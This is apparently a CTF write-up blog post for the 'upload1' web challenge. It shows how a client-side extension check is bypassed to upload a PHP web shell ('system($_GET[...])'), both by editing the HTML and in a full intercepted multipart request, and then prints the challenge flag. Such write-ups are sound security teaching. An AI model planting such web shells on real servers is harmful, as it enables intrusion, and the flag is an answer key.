---
layout: post
title: Web进阶题-upload1
excerpt: "攻防世界进阶Web题目-upload1"
date:   2020-10-24 14:16:00
categories: [CTF]
comments: true
---

## 我的解题过程

1. 访问目标网页，网页主要源码如下

   * 页面

     ```html
     <form enctype="multipart/form-data" id="aa" name="aaa" method="post" action="index.php"> 
         <input id="upfile" name="upfile" type="file" onchange="check();"> 
         <input type="submit" id="submit" value="上传"> 
     </form>
     ```

   * JavaScript

     ```javascript
     Array.prototype.contains = function (obj) {  
         var i = this.length;  
         while (i--) {  
             if (this[i] === obj) {  
                 return true;  
             }  
         }  
         return false;  
     }  
     
     function check(){
         upfile = document.getElementById("upfile");
         submit = document.getElementById("submit");
         name = upfile.value;
         ext = name.replace(/^.+\./,'');
     
         if(['jpg','png'].contains(ext)){
             submit.disabled = false;
         }else{
             submit.disabled = true;
     
             alert('请选择一张图片文件上传!');
         }
     }
     ```

   * ext是由将"匹配文件名从开头到第一个'\.'之间所有的字符删除"之后剩下的字符串"

   * 只有ext完全等于jpg或者png才允许上传

2. 所以只能上传jpg和png格式的文件，不能上传".jpg.php"

3. 尝试文件上传

   * 构造文件，文件内容为"\<?php phpinfo(); ?\>"，文件名为"img.png"
   * 上传，网页返回内容为"upload success : upload/1603528576.img.png"
   * 访问"/upload/1603528576.img.png"，并没有被执行

4. 重新阅读JavaScript代码，发现不允许上传只是通过input标签的disable属性，只需选择php文件，在提示不允许上传之后，将HTML代码中的disable删掉即可。

5. 重新构造payload

   * 构造文件，文件内容为"\<?php system($_GET['flag']); ?\>"，文件名为"233.php"
   * 选择文件，提示请选择一张图片，将HTML代码中的disable删除，上传
   * 访问目标文件，顺利执行

6. 使用system遍历目录，发现与index.php同目录有一个flag.php

7. 此时通过浏览器直接访问flag.php，发现返回空白网页，看来这个文件里某个变量应该是flag，而且没有输出的网页上

8. 继续使用system执行cat flag.php，网页页面为空白，这是因为浏览器不渲染标签内的PHP代码而是把它注释掉，所以在浏览器开发者工具的Elements窗口或者Network的Response窗口中会有对应的PHP代码

   ```php
   <?php
   $flag="cyberpeace{0526e633f96208d78a05c1f58ff8f2ac}";
   ?>
   ```

9. 发现flag，cyberpeace{0526e633f96208d78a05c1f58ff8f2ac}

10. 提交，答案正确


## 其他人的解法

1. 构造我之前第三步构造的文件，顺利发起请求，用Burp Suite进行截包

   ```http
   POST /index.php HTTP/1.1
   Host: xxx.yyy.zzz.233:666
   User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
   Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
   Referer: http://xxx.yyy.zzz.233:666/
   Content-Type: multipart/form-data; boundary=---------------------------2153339585284191841034996231
   Content-Length: 250
   Origin: http://xxx.yyy.zzz.233:666
   Connection: close
   Upgrade-Insecure-Requests: 1
   
   -----------------------------2153339585284191841034996231
   Content-Disposition: form-data; name="upfile"; filename="ctf.png"
   Content-Type: image/png
   
   <?php
   system($_GET['flag']);
    ?>
   -----------------------------2153339585284191841034996231--
   ```

2. 由于本题中服务器端并没有对上传文件的后缀名强制存储为jpg、png，所以将POST请求体中的filename修改为"ctf.php"，因为服务器端用了一个随机数与这个字段直接拼接成了文件名

3. 网页内容返回内容为"upload success : upload/1603530143.ctf.php ",其他的没有区别了

